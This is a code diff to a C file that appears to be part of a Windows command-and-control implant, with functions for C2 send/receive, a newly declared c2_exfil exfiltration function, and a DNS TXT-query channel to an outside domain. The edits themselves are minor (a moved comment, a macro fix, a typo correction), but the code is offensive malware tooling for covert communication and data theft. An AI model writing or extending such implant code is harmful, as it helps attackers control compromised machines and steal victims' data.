@@ -2,6 +2,7 @@
 #define _WINSOCK_WRAPPER_H_
 #endif
 
+// Need to do this because windows is stupid
 #ifndef _WINDOWS_
 #define WIN32_LEAN_AND_MEAN
 #define WIN32_NO_STATUS
@@ -12,9 +13,6 @@
 
 #ifndef C2_COMMS
 #define C2_COMMS
-
-
-// Need to do this because windows is stupid
 
 
 #include <winsock2.h>
@@ -54,6 +52,7 @@ void c2_log(const char* format, ...);
 int c2_send(char* buffer, int len);
 int c2_send_body(char* buffer, int len);
 int c2_recv(char* buffer, int len);
+int c2_exfil(char* data, int len);
 // -----------------------------------------------------------------------
 
 
@@ -77,7 +76,7 @@ const char* ACCEPTED_FILETYPES[] = {"text/html", NULL}; // unused for now
 // Gloabl heap handle
 HANDLE HEAP;
 #define Malloc(size) HeapAlloc(HEAP, HEAP_ZERO_MEMORY, (size))
-#define Free(ptr) HeapFree(HEAP, 0, ptr);
+#define Free(ptr) HeapFree(HEAP, 0, (ptr));
 
 
 // Sets up global HTTP connection handlers.
@@ -413,6 +412,7 @@ int c2_send(char* data, int len) {
 
 
 // TODO: needs lots of clean up
+// TODO: need to rename this too
 int c2_send2(char* msg, int len) {
 
     DNS_STATUS status;
@@ -437,7 +437,7 @@ int c2_send2(char* msg, int len) {
 
     status = DnsQuery_A("test.edu", DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE, pSrvList, &result, NULL);
     if (status == ERROR_INVALID_PARAMETER) {
-        c2_log("[!] dns invalud param\n");
+        c2_log("[!] dns invalid param\n");
         return 0;
     }
     if (status != ERROR_SUCCESS && status != DNS_INFO_NO_RECORDS) {
